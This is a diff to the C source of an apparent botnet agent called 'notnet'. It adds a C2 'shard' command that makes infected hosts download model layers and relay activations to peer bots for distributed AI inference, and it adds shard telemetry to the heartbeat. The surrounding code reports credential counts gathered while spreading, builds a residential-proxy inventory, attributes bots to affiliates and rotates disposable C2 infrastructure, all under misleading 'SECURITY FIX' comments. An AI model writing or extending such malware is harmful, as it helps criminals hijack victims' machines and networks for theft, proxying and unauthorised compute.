@@ -4140,6 +4140,122 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 protocol_send_response(bot, CMD_ARA,
                     "ara: usage 'ara status' | 'ara notes' | 'ara adapt <ip:port> [error]' | 'ara r0 <i> <q>'");
             }
+        } else if (strncmp(cmd, CMD_SHARD, strlen(CMD_SHARD)) == 0) {
+            /* #402: distributed-inference sharding control.
+             *   shard status                        — capacity + pipeline
+             *   shard assign <model> <start> <count> <idx> <peer,peer,...>
+             *                                      — set this host's layer range
+             *   shard fetch                         — download+verify my shard
+             *   shard forward <hexframe>            — push an activation to next peer
+             *   shard fleet <peers> <tok/s>         — feed the fleet tps estimate */
+            char *args = cmd + strlen(CMD_SHARD);
+            while (*args == ' ' || *args == '\t') args++;
+            char rbuf[1024];
+            if (args[0] == '\0' || strcmp(args, "status") == 0) {
+                shard_capacity_t cap;
+                shard_probe_capacity(&cap, 0, bot->shard.total_layers);
+                shard_assignment_t asg;
+                int have = (shard_get_assignment(&asg) == 0);
+                char st[160];
+                shard_status_render(&bot->shard, have ? &asg : NULL, &cap, st, sizeof(st));
+                snprintf(rbuf, sizeof(rbuf),
+                         "shard: enabled=%d model=%.32s layers=%u url=%.48s | %s",
+                         bot->shard.enabled,
+                         bot->shard.model[0] ? bot->shard.model : "(none)",
+                         bot->shard.total_layers,
+                         bot->shard.shard_url[0] ? bot->shard.shard_url : "(none)",
+                         st[0] ? st : "(no assignment)");
+                protocol_send_response(bot, CMD_SHARD, rbuf);
+            } else if (strncmp(args, "assign ", 7) == 0) {
+                /* assign <model> <start> <count> <idx> <p1,p2,...> */
+                shard_assignment_t asg;
+                memset(&asg, 0, sizeof(asg));
+                char peers[512] = {0};
+                int start = 0, count = 0, idx = 0;
+                int got = sscanf(args + 7, "%63s %d %d %d %511s",
+                                 asg.model, &start, &count, &idx, peers);
+                if (got < 4 || count <= 0 || start < 0) {
+                    protocol_send_response(bot, CMD_SHARD,
+                        "shard: usage 'shard assign <model> <start> <count> <idx> <peer,peer,...>'");
+                } else {
+                    asg.layer_start = (uint16_t)start;
+                    asg.layer_count = (uint16_t)count;
+                    asg.my_index = idx;
+                    if (got == 5 && peers[0]) {
+                        char *save = NULL;
+                        for (char *t = strtok_r(peers, ",", &save);
+                             t && asg.peer_count < SHARD_PEER_MAX;
+                             t = strtok_r(NULL, ",", &save)) {
+                            snprintf(asg.peers[asg.peer_count], 256, "%s", t);
+                            asg.peer_count++;
+                        }
+                    }
+                    shard_set_assignment(&asg);
+                    snprintf(rbuf, sizeof(rbuf),
+                             "shard: assigned %s layers %d+%d idx=%d peers=%d",
+                             asg.model, start, count, idx, asg.peer_count);
+                    protocol_send_response(bot, CMD_SHARD, rbuf);
+                }
+            } else if (strcmp(args, "fetch") == 0) {
+                shard_assignment_t asg;
+                if (shard_get_assignment(&asg) != 0) {
+                    protocol_send_response(bot, CMD_SHARD, "shard: no assignment — 'shard assign' first");
+                } else {
+                    int rc = shard_fetch(bot, &bot->shard, &asg);
+                    snprintf(rbuf, sizeof(rbuf),
+                             rc == 0 ? "shard: fetched + verified layers %u-%u"
+                                     : "shard: fetch failed (see bot log)",
+                             asg.layer_start,
+                             (unsigned)asg.layer_start + asg.layer_count - 1);
+                    protocol_send_response(bot, CMD_SHARD, rbuf);
+                }
+            } else if (strncmp(args, "forward ", 8) == 0) {
+                /* forward <hexframe> — decode hex, push to next peer */
+                const char *hex = args + 8;
+                size_t hl = strlen(hex);
+                if (hl == 0 || (hl % 2) != 0 || hl > 512) {
+                    protocol_send_response(bot, CMD_SHARD, "shard: forward needs an even-length hex frame (<=256 bytes)");
+                } else {
+                    unsigned char frame[256];
+                    size_t fl = 0;
+                    int ok = 1;
+                    for (size_t i = 0; i < hl; i += 2) {
+                        char b[3] = { hex[i], hex[i+1], 0 };
+                        char *end = NULL;
+                        long v = strtol(b, &end, 16);
+                        if (end != b + 2) { ok = 0; break; }
+                        frame[fl++] = (unsigned char)v;
+                    }
+                    shard_assignment_t asg;
+                    if (!ok) {
+                        protocol_send_response(bot, CMD_SHARD, "shard: bad hex frame");
+                    } else if (shard_get_assignment(&asg) != 0) {
+                        protocol_send_response(bot, CMD_SHARD, "shard: no assignment");
+                    } else {
+                        int rc = shard_forward(&asg, frame, fl);
+                        snprintf(rbuf, sizeof(rbuf),
+                                 rc == 0 ? "shard: forwarded %zu bytes to next peer"
+                                         : "shard: forward failed (last peer / relay refused)",
+                                 fl);
+                        protocol_send_response(bot, CMD_SHARD, rbuf);
+                    }
+                }
+            } else if (strncmp(args, "fleet ", 6) == 0) {
+                int peers = 0;
+                double tps = 0;
+                if (sscanf(args + 6, "%d %lf", &peers, &tps) == 2) {
+                    shard_update_fleet_tps(peers, (uint32_t)(tps * 100.0));
+                    snprintf(rbuf, sizeof(rbuf), "shard: fleet tps -> %d.%02d",
+                             shard_fleet_tps_x100() / 100, shard_fleet_tps_x100() % 100);
+                } else {
+                    snprintf(rbuf, sizeof(rbuf), "shard: usage 'shard fleet <peers> <tok/s>'");
+                }
+                protocol_send_response(bot, CMD_SHARD, rbuf);
+            } else {
+                protocol_send_response(bot, CMD_SHARD,
+                    "shard: usage 'shard status' | 'shard assign <m> <s> <c> <i> <peers>' | "
+                    "'shard fetch' | 'shard forward <hex>' | 'shard fleet <p> <tps>'");
+            }
         } else if (strncmp(cmd, CMD_ROTATE, strlen(CMD_ROTATE)) == 0) {
             /* SECURITY FIX (#93): manual C2 rotation — advance the
              * disposable-infrastructure chain immediately. Operator
@@ -4270,6 +4386,18 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
     char ara_stats[64];
     ara_status_render(ara_stats, sizeof(ara_stats));
 
+    /* #402: shard telemetry — "model=..;layers=s-e;idx=i/n;peers=k;
+     * ram=MB;arch=..;tok=x.xx". Empty when sharding disabled. */
+    char shard_stats[160];
+    {
+        shard_capacity_t scap;
+        shard_probe_capacity(&scap, 0, bot->shard.total_layers);
+        shard_assignment_t sasg;
+        int have = (shard_get_assignment(&sasg) == 0);
+        shard_status_render(&bot->shard, have ? &sasg : NULL, &scap,
+                            shard_stats, sizeof(shard_stats));
+    }
+
     char heartbeat[2048];
     /* SECURITY FIX (#89): report proxy status so the C2 can build a
      * residential-proxy inventory (on/off + bound port).
@@ -4279,10 +4407,10 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
      * (#93): report the affiliate/operator tag so the C2 can attribute
      * bots to affiliates (per-affiliate inventory + teardown). */
     int ret = snprintf(heartbeat, sizeof(heartbeat),
-        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d,\"relay_on\":%d,\"relay_port\":%d,\"tag\":\"%s\",\"cve_stats\":\"%s\",\"ara\":\"%s\"}",
+        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d,\"relay_on\":%d,\"relay_port\":%d,\"tag\":\"%s\",\"cve_stats\":\"%s\",\"ara\":\"%s\",\"shard\":\"%s\"}",
         NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count,
         spread_cred_count(), safe_secret, proxy_is_running() ? 1 : 0, proxy_get_port(),
-        relay_is_running() ? 1 : 0, relay_get_port(), safe_tag, cve_stats, ara_stats);
+        relay_is_running() ? 1 : 0, relay_get_port(), safe_tag, cve_stats, ara_stats, shard_stats);
     if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
         log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
     }
@@ -5180,6 +5308,30 @@ int load_config(notnet_bot_t *bot, const char *path) {
         } else if (strcmp(key, "ara_notes_dir") == 0) {
             strncpy(bot->ara_notes_dir, value, sizeof(bot->ara_notes_dir) - 1);
             bot->ara_notes_dir[sizeof(bot->ara_notes_dir) - 1] = '\0';
+        } else if (strcmp(key, "shard_enabled") == 0) {
+            /* #402: distributed-inference sharding master switch. */
+            bot->shard.enabled = (atoi(value) != 0);
+        } else if (strcmp(key, "shard_model") == 0) {
+            strncpy(bot->shard.model, value, sizeof(bot->shard.model) - 1);
+            bot->shard.model[sizeof(bot->shard.model) - 1] = '\0';
+        } else if (strcmp(key, "shard_layers") == 0) {
+            int v = atoi(value);
+            if (v >= 1 && v <= SHARD_LAYER_MAX) bot->shard.total_layers = (uint16_t)v;
+        } else if (strcmp(key, "shard_url") == 0) {
+            strncpy(bot->shard.shard_url, value, sizeof(bot->shard.shard_url) - 1);
+            bot->shard.shard_url[sizeof(bot->shard.shard_url) - 1] = '\0';
+        } else if (strcmp(key, "shard_sha256") == 0) {
+            strncpy(bot->shard.shard_sha, value, sizeof(bot->shard.shard_sha) - 1);
+            bot->shard.shard_sha[sizeof(bot->shard.shard_sha) - 1] = '\0';
+        } else if (strcmp(key, "shard_dir") == 0) {
+            strncpy(bot->shard.shard_dir, value, sizeof(bot->shard.shard_dir) - 1);
+            bot->shard.shard_dir[sizeof(bot->shard.shard_dir) - 1] = '\0';
+        } else if (strcmp(key, "shard_relay_port") == 0) {
+            int v = atoi(value);
+            if (v >= 1 && v <= 65535) bot->shard.relay_port = (uint16_t)v;
+        } else if (strcmp(key, "shard_tok_per_sec") == 0) {
+            /* x100 fixed point: config is tok/s with 2 decimals */
+            bot->shard.tok_per_sec = (uint32_t)(atof(value) * 100.0);
         } else if (strncmp(key, "c2_backup_", 10) == 0) {
             /* SECURITY FIX (#93): disposable-infrastructure backup
              * endpoints, c2_backup_<n> = host:port with n in 1..4.
